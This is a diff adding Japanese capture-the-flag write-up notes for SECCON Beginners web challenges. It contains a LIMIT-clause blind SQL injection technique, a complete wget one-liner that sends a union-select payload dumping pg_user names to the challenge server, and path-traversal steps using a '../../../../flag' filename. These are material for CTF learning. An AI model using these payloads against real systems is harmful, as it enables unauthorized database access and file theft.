@@ -26,8 +26,17 @@
     条件: searchは'が使えない。
     このlimitの後がインジェクション対策を怠っており攻撃が可能になっている。がsplitされるためクエリを投げられない。
 
+    つまり...
+    limit句以降にあるSQLiでascii(substr((select user), 1, 1));-- のような形で表示件数を絞り，その件数から1文字ずつフラグを特定できる
+
+    Answer(想定解)
+    Answer(想定外の解答)
+        echo -e "%\\' union select usename as url, usename as text, NOW() as tweeted_at from pg_user--" | nkf -WwMQ |sed -e "s/=\$//" | tr -d "\n" | tr = % | xargs -I{} wget -v -O - https://tweetstore.quals.beginners.seccon.jp/?search={}\&limit=10
+
 
 ### unzip
+    1. '../../../../flag'のような名前のファイルを作成し、アップロードする。
+    2. (php スクリプト)?filename=../../../../flag にアクセスする
 
 
 ## pwn
